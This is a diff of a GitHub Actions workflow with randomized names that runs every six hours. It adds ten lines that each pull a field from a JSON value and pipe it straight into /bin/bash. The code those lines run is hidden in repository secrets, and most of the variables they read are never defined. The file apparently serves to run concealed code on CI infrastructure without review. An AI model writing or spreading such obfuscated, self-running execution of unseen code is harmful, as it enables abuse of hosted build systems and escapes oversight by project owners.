@@ -1,25 +1,26 @@
 name: hugouhuohuang
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 2/6 * * *'
+    - cron: '37 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: hugouhuohuang
         env:
-          zd23: ${{ secrets.zd23 }}
+          utyfp803: ${{ secrets.utyfp803 }}
         run: |
-          echo $zd23 | jq -r .duqax144 | /bin/bash
-          echo $rtns49916 | jq -r .by0888 | /bin/bash
-          echo $h662 | jq -r .jrfi017 | /bin/bash
-          echo $nzbm73 | jq -r .dfeo456 | /bin/bash
-          echo $jvizn5 | jq -r .sx9024 | /bin/bash
-          echo $yg2525 | jq -r .jew7 | /bin/bash
-          echo $a251 | jq -r .ku21 | /bin/bash
+          echo $utyfp803 | jq -r .vk19 | /bin/bash
+          echo $v10892 | jq -r .m696 | /bin/bash
+          echo $yp2264 | jq -r .g4 | /bin/bash
+          echo $xfb0433 | jq -r .pdk7227 | /bin/bash
+          echo $ermvs13728 | jq -r .vlgpl0925 | /bin/bash
+          echo $l98 | jq -r .sd90 | /bin/bash
+          echo $vurdf0276 | jq -r .hwtv831 | /bin/bash
+          echo $akrow0959 | jq -r .d42 | /bin/bash
+          echo $xcff0279 | jq -r .iy016 | /bin/bash
+          echo $zx942 | jq -r .wsja847 | /bin/bash
 
